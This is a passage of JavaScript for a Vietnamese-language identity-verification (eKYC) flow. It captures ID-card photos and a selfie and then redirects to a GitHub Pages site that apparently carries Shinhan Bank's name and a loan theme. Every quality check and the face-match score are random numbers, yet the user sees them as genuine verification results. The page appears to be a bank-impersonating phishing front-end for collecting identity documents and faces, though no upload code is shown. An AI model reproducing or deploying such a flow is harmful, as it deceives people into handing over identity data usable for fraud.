                { idNumber: '123456789012', fullName: 'NGUYỄN VĂN A', dateOfBirth: '01/01/1990' },
                { idNumber: '987654321098', fullName: 'TRẦN THỊ B', dateOfBirth: '15/05/1985' },
                { idNumber: '456789123456', fullName: 'LÊ VĂN C', dateOfBirth: '20/12/1992' }
            ];
            return mockData[Math.floor(Math.random() * mockData.length)];
        }

        // Image quality checking
        async checkImageQuality(imageData, imageType) {
            // Simulate image quality analysis
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            const errors = [];
            let isValid = true;
            
            // Simulate random quality issues (30% chance of issues)
            const hasQualityIssues = Math.random() < 0.3;
            
            if (hasQualityIssues) {
                const possibleErrors = [
                    'Ảnh bị mờ, vui lòng chụp lại',
                    'Ánh sáng không đủ, vui lòng chụp ở nơi sáng hơn',
                    'Ảnh bị lóa sáng, vui lòng tránh ánh sáng trực tiếp',
                    'Không phát hiện được giấy tờ trong khung hình',
                    'Giấy tờ bị che khuất một phần',
                    'Góc chụp không phù hợp, vui lòng chụp thẳng'
                ];
                
                // Random 1-2 errors
                const numErrors = Math.random() < 0.7 ? 1 : 2;
                for (let i = 0; i < numErrors; i++) {
                    const randomError = possibleErrors[Math.floor(Math.random() * possibleErrors.length)];
                    if (!errors.includes(randomError)) {
                        errors.push(randomError);
                    }
                }
                isValid = false;
            }
            
            return { isValid, errors, confidence: isValid ? 0.85 + Math.random() * 0.15 : 0.3 + Math.random() * 0.4 };
        }

        // Show image quality errors
        showImageErrors(errors) {
            const errorMessage = 'Chất lượng ảnh không đạt yêu cầu:\n\n' + 
                               errors.map(error => '• ' + error).join('\n') + 
                               '\n\nVui lòng chụp lại ảnh.';
            
            alert(errorMessage);
        }

        needsBackCapture() {
            return ['cccd', 'other'].includes(this.state.selectedDocType);
        }

        stopCamera() {
            if (this.state.cameraStream) {
                this.state.cameraStream.getTracks().forEach(track => track.stop());
                this.state.cameraStream = null;
            }
            
            if (this.state.captureTimeout) {
                clearInterval(this.state.captureTimeout);
                this.state.captureTimeout = null;
            }
        }

        // File Upload
        handleFileUpload(e) {
            const file = e.target.files[0];
            if (file && file.type.startsWith('image/')) {
                const reader = new FileReader();
                reader.onload = (event) => {
                    const imageData = event.target.result;
                    this.state.capturedImages[this.state.captureStep] = imageData;
                    this.processImage(imageData);
                };
                reader.readAsDataURL(file);
            }
        }

        // Confirmation View
        showConfirmation() {
            this.showView('confirmView');
            this.updateStepper(this.languages[this.currentLang].stepper_step3);
            this.updateProgressBar(3);
            
            if (this.dom.confirmFrontImg && this.state.capturedImages.front) {
                this.dom.confirmFrontImg.src = this.state.capturedImages.front;
            }
            
            if (this.dom.confirmBackImg && this.state.capturedImages.back) {
                this.dom.confirmBackImg.src = this.state.capturedImages.back;
            } else if (this.dom.confirmBackItem && !this.needsBackCapture()) {
                this.dom.confirmBackItem.style.display = 'none';
            }

            this.updateExtractedInfo();
        }

        updateExtractedInfo() {
            if (this.dom.infoIdNumber) {
                this.dom.infoIdNumber.textContent = this.state.extractedInfo.idNumber || 'Đang xử lý...';
            }
            if (this.dom.infoFullName) {
                this.dom.infoFullName.textContent = this.state.extractedInfo.fullName || 'Đang xử lý...';
            }
            if (this.dom.infoDob) {
                this.dom.infoDob.textContent = this.state.extractedInfo.dateOfBirth || 'Đang xử lý...';
            }
        }

        // Video Tutorial
        showVideoTutorial() {
            this.showView('videoTutorialView');
            this.updateStepper(this.languages[this.currentLang].stepper_step4);
            this.updateProgressBar(4);
            
            if (this.dom.tutorialVideo) {
                this.dom.tutorialVideo.play().catch(console.error);
            }
        }

        // Face Capture and Liveness
        async startFaceCapture() {
            this.showView('faceCaptureView');
            this.state.livenessStep = 0;
            this.state.livenessCompleted = false;
            this.updateProgressBar(4);
            
            try {
                await this.initFaceCamera();
                this.startLivenessCheck();
            } catch (error) {
                console.error('Face camera initialization failed:', error);
                this.showError(this.languages[this.currentLang].error_no_face);
            }
        }

        async initFaceCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: 'user'
                    }
                });

                this.state.faceCameraStream = stream;
                if (this.dom.faceCameraVideo) {
                    this.dom.faceCameraVideo.srcObject = stream;
                    await this.dom.faceCameraVideo.play();
                }
            } catch (error) {
                console.error('Face camera access failed:', error);
                throw error;
            }
        }

        startLivenessCheck() {
            this.updateLivenessStep(0);
            
            const steps = ['straight', 'smile', 'right', 'left'];
            let currentStep = 0;

            const nextStep = () => {
                if (currentStep < steps.length) {
                    this.updateLivenessStep(currentStep);
                    currentStep++;
                    setTimeout(nextStep, this.config.LIVENESS_ACTION_DURATION);
                } else {
                    this.completeLivenessCheck();
                }
            };

            setTimeout(nextStep, 1000);
        }

        updateLivenessStep(stepIndex) {
            this.dom.livenessSteps.forEach((step, index) => {
                step.classList.remove('active', 'completed', 'error');
                
                if (index < stepIndex) {
                    step.classList.add('completed');
                } else if (index === stepIndex) {
                    step.classList.add('active');
                }
            });

            const instructions = [
                'Nhìn thẳng vào camera',
                'Vui lòng mỉm cười',
                'Quay mặt sang phải',
                'Quay mặt sang trái',
                'Xác thực thành công!'
            ];

            if (this.dom.faceCaptureInstruction && instructions[stepIndex]) {
                this.dom.faceCaptureInstruction.textContent = instructions[stepIndex];
            }
        }

        async completeLivenessCheck() {
            this.state.livenessCompleted = true;
            this.updateLivenessStep(4);
            
            // Capture face image
            await this.captureFaceImage();
            
            if (this.dom.btnConfirmLiveness) {
                this.dom.btnConfirmLiveness.disabled = false;
            }

            if (this.state.faceCameraStream) {
                this.state.faceCameraStream.getTracks().forEach(track => track.stop());
                this.state.faceCameraStream = null;
            }
        }

        // Capture face image for comparison
        async captureFaceImage() {
            try {
                const canvas = this.dom.faceCameraCanvas;
                const video = this.dom.faceCameraVideo;
                
                if (canvas && video) {
                    const ctx = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    
                    const faceImageData = canvas.toDataURL('image/jpeg', 0.8);
                    this.state.capturedImages.face = faceImageData;

                    // Check face image quality
                    const faceQualityCheck = await this.checkFaceQuality(faceImageData);
                    this.state.imageQualityChecks.face = faceQualityCheck;
                    
                    if (!faceQualityCheck.isValid) {
                        this.showFaceErrors(faceQualityCheck.errors);
                        // Restart liveness check
                        setTimeout(() => {
                            this.startLivenessCheck();
                        }, 2000);
                        return;
                    }
                }
            } catch (error) {
                console.error('Face capture failed:', error);
                this.showError('Không thể chụp ảnh khuôn mặt. Vui lòng thử lại.');
            }
        }

        // Check face image quality
        async checkFaceQuality(imageData) {
            await new Promise(resolve => setTimeout(resolve, 800));
            
            const errors = [];
            let isValid = true;
            
            // Simulate face quality issues (25% chance)
            const hasFaceIssues = Math.random() < 0.25;
            
            if (hasFaceIssues) {
                const possibleErrors = [
                    'Khuôn mặt không rõ nét',
                    'Ánh sáng không đủ để nhận diện khuôn mặt',
                    'Khuôn mặt bị che khuất',
                    'Không phát hiện được khuôn mặt',
                    'Khuôn mặt quá xa hoặc quá gần camera',
                    'Góc chụp khuôn mặt không phù hợp'
                ];
                
                const randomError = possibleErrors[Math.floor(Math.random() * possibleErrors.length)];
                errors.push(randomError);
                isValid = false;
            }
            
            return { isValid, errors, confidence: isValid ? 0.8 + Math.random() * 0.2 : 0.2 + Math.random() * 0.5 };
        }

        // Show face quality errors
        showFaceErrors(errors) {
            const errorMessage = 'Chất lượng ảnh khuôn mặt không đạt yêu cầu:\n\n' + 
                               errors.map(error => '• ' + error).join('\n') + 
                               '\n\nVui lòng thực hiện lại quá trình xác thực khuôn mặt.';
            
            alert(errorMessage);
        }

        // Final Review View
        async showFinalReview() {
            this.showView('finalReviewView');
            this.updateStepper('Bước 5/5: Xem lại thông tin');
            this.updateProgressBar(5);
            
            // Populate review data
            this.populateReviewData();
            
            // Perform face matching
            await this.performFaceMatching();
        }

        // Populate review data
        populateReviewData() {
            // Set images
            if (this.dom.reviewFrontImg && this.state.capturedImages.front) {
                this.dom.reviewFrontImg.src = this.state.capturedImages.front;
            }
            
            if (this.dom.reviewBackImg && this.state.capturedImages.back) {
                this.dom.reviewBackImg.src = this.state.capturedImages.back;
            } else if (this.dom.reviewBackItem && !this.needsBackCapture()) {
                this.dom.reviewBackItem.style.display = 'none';
            }
            
            if (this.dom.reviewFaceImg && this.state.capturedImages.face) {
                this.dom.reviewFaceImg.src = this.state.capturedImages.face;
            }

            // Set quality indicators
            this.setQualityIndicator('frontQuality', this.state.imageQualityChecks.front);
            if (this.needsBackCapture()) {
                this.setQualityIndicator('backQuality', this.state.imageQualityChecks.back);
            }
            this.setQualityIndicator('faceQuality', this.state.imageQualityChecks.face);

            // Set extracted information
            if (this.dom.reviewIdNumber) {
                this.dom.reviewIdNumber.textContent = this.state.extractedInfo.idNumber || 'Đang xử lý...';
            }
            if (this.dom.reviewFullName) {
                this.dom.reviewFullName.textContent = this.state.extractedInfo.fullName || 'Đang xử lý...';
            }
            if (this.dom.reviewDob) {
                this.dom.reviewDob.textContent = this.state.extractedInfo.dateOfBirth || 'Đang xử lý...';
            }
        }

        // Set quality indicator
        setQualityIndicator(elementId, qualityCheck) {
            const element = this.dom[elementId];
            if (!element || !qualityCheck) return;

            if (qualityCheck.isValid) {
                element.textContent = 'Chất lượng tốt';
                element.className = 'quality-indicator good';
            } else {
                element.textContent = 'Cần cải thiện';
                element.className = 'quality-indicator warning';
            }
        }

        // Perform face matching
        async performFaceMatching() {
            this.showLoading('Đang so sánh khuôn mặt...');
            
            // Simulate face matching process
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            // Generate random match score (simulate real matching)
            const matchScore = Math.random() * 100;
            this.state.faceMatchScore = matchScore;
            
            this.hideLoading();
            this.displayMatchResult(matchScore);
        }

        // Display match result
        displayMatchResult(score) {
            const roundedScore = Math.round(score);
            
            if (this.dom.scoreValue) {
                this.dom.scoreValue.textContent = roundedScore + '%';
            }

            const scoreCircle = this.dom.matchScore?.querySelector('.score-circle');
            const scoreLabel = this.dom.scoreLabel;
            const matchDetails = this.dom.matchDetails;

            if (scoreCircle) {
                // Set CSS custom property for animation
                scoreCircle.style.setProperty('--score-angle', (score * 3.6) + 'deg');
            }

            if (score >= 60) {
                // Success
                if (scoreCircle) scoreCircle.className = 'score-circle success';
                if (scoreLabel) {
                    scoreLabel.textContent = 'Xác thực thành công';
                    scoreLabel.className = 'score-label success';
                }
                if (matchDetails) {
                    matchDetails.innerHTML = '<p>Khuôn mặt trong ảnh xác thực khớp với ảnh trong giấy tờ. Bạn có thể tiếp tục hoàn tất quá trình xác thực.</p>';
                }
            } else {
                // Failure
                if (scoreCircle) scoreCircle.className = 'score-circle error';
                if (scoreLabel) {
                    scoreLabel.textContent = 'Xác thực không thành công';
                    scoreLabel.className = 'score-label error';
                }
                if (matchDetails) {
                    matchDetails.innerHTML = '<p>Khuôn mặt trong ảnh xác thực không khớp đủ với ảnh trong giấy tờ. Vui lòng thực hiện lại quá trình xác thực.</p>';
                }
            }
        }

        // Success View
        showSuccess() {
            this.showView('successView');
            
            if (this.successAnimation) {
                this.successAnimation.play();
            }
        }

        // QR Scanner
        async startQRScan() {
            this.showView('qrScannerModal');
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: 'environment'
                    }
                });

                this.state.qrStream = stream;
                if (this.dom.qrVideo) {
                    this.dom.qrVideo.srcObject = stream;
                    await this.dom.qrVideo.play();
                }

                this.startQRDetection();
            } catch (error) {
                console.error('QR camera access failed:', error);
                this.cancelQRScan();
            }
        }

        startQRDetection() {
            const detectQR = () => {
                if (this.state.qrStream && this.dom.qrVideo) {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    canvas.width = this.dom.qrVideo.videoWidth;
                    canvas.height = this.dom.qrVideo.videoHeight;
                    ctx.drawImage(this.dom.qrVideo, 0, 0);
                    
                    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                    
                    if (typeof jsQR !== 'undefined') {
                        const code = jsQR(imageData.data, imageData.width, imageData.height);
                        if (code) {
                            this.handleQRDetected(code.data);
                            return;
                        }
                    }
                    
                    requestAnimationFrame(detectQR);
                }
            };
            
            detectQR();
        }

        handleQRDetected(qrData) {
            console.log('QR Code detected:', qrData);
            this.cancelQRScan();
            
            this.state.extractedInfo = {
                idNumber: 'QR-' + Date.now(),
                fullName: 'QR User',
                dateOfBirth: '01/01/1990'
            };
            
            this.showConfirmation();
        }

        cancelQRScan() {
            if (this.state.qrStream) {
                this.state.qrStream.getTracks().forEach(track => track.stop());
                this.state.qrStream = null;
            }
            
            this.showView('docSelectView');
        }

        // Navigation
        goBack() {
            switch (this.state.currentView) {
                case 'captureView':
                    this.stopCamera();
                    this.showView('docSelectView');
                    this.updateStepper(this.languages[this.currentLang].stepper_step1);
                    break;
                case 'confirmView':
                    this.startCapture();
                    break;
                case 'faceCaptureView':
                    this.showView('videoTutorialView');
                    break;
                default:
                    this.showView('docSelectView');
                    this.updateStepper(this.languages[this.currentLang].stepper_step1);
            }
        }

        // Retake functionality
        handleRetake(e) {
            const retakeType = e.currentTarget.dataset.retake;
            this.state.captureStep = retakeType;
            this.startCapture();
        }

        // Fullscreen image
        showFullscreenImage(e) {
            const imgSrc = e.currentTarget.src;
            if (this.dom.fullscreenModal && this.dom.fullscreenImage) {
                this.dom.fullscreenImage.src = imgSrc;
                this.dom.fullscreenModal.classList.remove('hidden');
            }
        }

        // Keyboard handling
        handleKeydown(e) {
            if (e.key === 'Escape') {
                if (this.dom.fullscreenModal && !this.dom.fullscreenModal.classList.contains('hidden')) {
                    this.dom.fullscreenModal.classList.add('hidden');
                }
                
                ['cccdGuideModal', 'passportGuideModal', 'driverLicenseGuideModal'].forEach(modalId => {
                    this.hideModal(modalId);
                });
            }
            
            // Test shortcut: Press 'T' to jump to success view for testing
            if (e.key === 't' || e.key === 'T') {
                this.testJumpToSuccess();
            }
        }

        // Test function to jump to final review view
        testJumpToSuccess() {
            // Set mock data
            this.state.extractedInfo = {
                idNumber: '123456789012',
                fullName: 'NGUYỄN VĂN A',
                dateOfBirth: '01/01/1990'
            };
            
            // Set mock captured images (base64 placeholder)
            const mockImageData = 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABmX/9k=';
            
            this.state.capturedImages = {
                front: mockImageData,
                back: mockImageData,
                face: mockImageData
            };
            
            // Set mock quality checks
            this.state.imageQualityChecks = {
                front: { isValid: true, errors: [], confidence: 0.95 },
                back: { isValid: true, errors: [], confidence: 0.92 },
                face: { isValid: true, errors: [], confidence: 0.88 }
            };
            
            // Show final review view
            this.showFinalReview();
            
            console.log('Test mode: Jumped to final review view. Check face matching and final submission.');
        }

        // Loading and Error handling
        showLoading(message) {
            if (this.dom.loadingOverlay) {
                this.dom.loadingOverlay.classList.remove('hidden');
                const loadingText = this.dom.loadingOverlay.querySelector('.loading-text');
                if (loadingText) {
                    loadingText.textContent = message;
                }
                if (this.loadingAnimation) {
                    this.loadingAnimation.play();
                }
            }
        }

        hideLoading() {
            if (this.dom.loadingOverlay) {
                this.dom.loadingOverlay.classList.add('hidden');
                if (this.loadingAnimation) {
                    this.loadingAnimation.stop();
                }
            }
        }

        showError(message) {
            if (this.dom.errorMessage) {
                this.dom.errorMessage.textContent = message;
                this.dom.errorMessage.classList.add('visible');
                
                setTimeout(() => {
                    this.dom.errorMessage.classList.remove('visible');
                }, this.config.ERROR_MESSAGE_TIMEOUT);
            }
        }

        // Final confirmation
        finalConfirm() {
            this.showLoading('Đang gửi thông tin...');
            
            // Check face match score
            setTimeout(() => {
                this.hideLoading();
                
                if (this.state.faceMatchScore >= 60) {
                    // Face match successful - redirect to step 4
                    this.handleVerificationSuccess();
                } else {
                    // Face match failed - show specific error
                    this.handleFaceMatchFailure();
                }
            }, 2000);
        }

        // Handle face match failure
        handleFaceMatchFailure() {
            const retryConfirm = confirm(
                `Xác thực khuôn mặt không thành công!\n\n` +
                `Điểm số so sánh: ${Math.round(this.state.faceMatchScore)}%\n` +
                `Yêu cầu tối thiểu: 60%\n\n` +
                `Nguyên nhân có thể do:\n` +
                `• Ảnh khuôn mặt không rõ nét\n` +
                `• Góc chụp không phù hợp\n` +
                `• Ánh sáng không đủ\n` +
                `• Khuôn mặt trong giấy tờ không rõ\n\n` +
                `Bạn có muốn thực hiện lại quá trình xác thực không?`
            );
            
            if (retryConfirm) {
                this.retryVerification();
            } else {
                this.showError('Xác thực đã bị hủy. Vui lòng thử lại sau.');
            }
        }

        // Handle successful verification
        handleVerificationSuccess() {
            // Show success message
            alert('Xác thực eKYC hoàn tất thành công! Đang chuyển đến bước tiếp theo...');
            
            // Redirect to step 4 URL
            setTimeout(() => {
                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html';
            }, 1000);
        }

        // Handle verification failure
        handleVerificationFailure() {
            // Show error message with retry option
            const retryConfirm = confirm(
                'Xác thực không thành công. Có thể do:\n' +
                '• Hình ảnh không rõ nét\n' +
                '• Thông tin không khớp\n' +
                '• Lỗi kết nối\n\n' +
                'Bạn có muốn thử lại không?'
            );
            
            if (retryConfirm) {
                // Reset to document selection to start over
                this.retryVerification();
            } else {
                // User chose not to retry, stay on success view
                this.showError('Xác thực đã bị hủy. Vui lòng thử lại sau.');
            }
        }

        // Retry verification process
        retryVerification() {
            // Reset state
            this.initState();
            
            // Show document selection view
            this.showView('docSelectView');
            this.updateStepper(this.languages[this.currentLang].stepper_step1);
            
            // Show retry message
            this.showError('Đang khởi động lại quá trình xác thực. Vui lòng chọn loại giấy tờ.');
        }

        // Handle guide link click
        handleGuideLinkClick(e) {
            e.preventDefault();
            
            // Show appropriate guide modal based on selected document type
            switch (this.state.selectedDocType) {
                case 'cccd':
                case 'other':
                    this.showModal('cccdGuideModal');
                    break;
                case 'passport':
                    this.showModal('passportGuideModal');
                    break;
                case 'driver':
                    this.showModal('driverLicenseGuideModal');
                    break;
                default:
                    // Default to CCCD guide if no document type selected
                    this.showModal('cccdGuideModal');
            }
        }
    }

    // Initialize the application
    new EkycApp();
});
